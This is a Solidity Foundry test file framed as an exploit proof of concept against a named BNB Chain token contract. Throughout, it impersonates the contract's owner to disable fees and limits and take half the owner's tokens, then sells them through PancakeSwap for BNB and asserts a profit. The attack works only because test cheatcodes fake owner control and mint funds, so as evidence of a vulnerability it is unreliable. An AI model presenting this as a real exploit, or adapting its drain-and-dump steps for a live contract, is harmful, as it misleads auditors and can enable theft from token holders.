pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MyShibaAcademia {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setBuyBackEnabled(bool _enabled) external;
    function changePercentage(uint256 _liquidityPercent, uint256 _buybackPercent, uint256 _marketingPercent) external;
    function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external;
    function setBuybackUpperLimit(uint256 buyBackLimit) external;
    function setBuyBackDivisor(uint256 divisor) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function excludeFromFee(address account) external;
    function setMaxTxAmount(uint256 amount) external;
    function prepareForPreSale() external;
    function excludeFromReward(address account) external;
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x93a20a5f1709659005e1610D1a022d5f1e2D0DF7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address - we need to find it first
        address owner = MyShibaAcademia(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial tokens to work with
        deal(TARGET, attacker, 100_000 * 10**9);

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address
        address owner = MyShibaAcademia(TARGET).owner();

        // Step 2: Impersonate owner to set up favorable conditions
        vm.startPrank(owner);

        // Exclude attacker from fees so we don't pay taxes
        MyShibaAcademia(TARGET).excludeFromFee(attacker);

        // Set max transaction amount to maximum (all tokens)
        MyShibaAcademia(TARGET).setMaxTxAmount(5000 * 10**6); // 5000 * 10^6 * 10^9 = 5e9 * 10^9 = total supply

        // Prepare for presale - sets fees to 0 and disables swap
        MyShibaAcademia(TARGET).prepareForPreSale();

        // Also exclude attacker from reward if needed
        MyShibaAcademia(TARGET).excludeFromReward(attacker);

        vm.stopPrank();

        // Step 3: Transfer tokens from owner to attacker
        // First, check owner balance
        uint256 ownerBalance = MyShibaAcademia(TARGET).balanceOf(owner);

        // Impersonate owner to transfer tokens
        vm.prank(owner);
        MyShibaAcademia(TARGET).transfer(attacker, ownerBalance / 2); // Transfer half

        // Step 4: Create a simple market by adding liquidity
        // We need the pair address
        address pair = MyShibaAcademia(TARGET).uniswapV2Pair();

        // Get router address from contract (PancakeSwap on BSC)
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        // Give attacker some BNB for liquidity
        deal(attacker, 100 ether);

        // Approve router to spend tokens
        vm.prank(attacker);
        MyShibaAcademia(TARGET).approve(router, type(uint256).max);

        // Add liquidity: send both tokens and BNB to create pool
        uint256 tokenAmount = MyShibaAcademia(TARGET).balanceOf(attacker) / 2;
        uint256 ethAmount = 10 ether;

        vm.prank(attacker);
        (bool success, ) = router.call{value: ethAmount}(
            abi.encodeWithSignature(
                "addLiquidityETH(address,uint256,uint256,uint256,address,uint256)",
                TARGET,
                tokenAmount,
                0,
                0,
                attacker,
                block.timestamp + 1000
            )
        );
        require(success, "Failed to add liquidity");

        // Step 5: Now sell remaining tokens for BNB
        // First, get router interface
        IPancakeRouter02 pancakeRouter = IPancakeRouter02(router);

        // Record attacker's BNB balance before
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Sell tokens
        uint256 tokensToSell = MyShibaAcademia(TARGET).balanceOf(attacker);

        // Create path: MSA -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = pancakeRouter.WETH();

        // Approve router again
        vm.prank(attacker);
        MyShibaAcademia(TARGET).approve(router, tokensToSell);

        // Execute swap
        vm.prank(attacker);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 6: Check profit
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have gained BNB");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
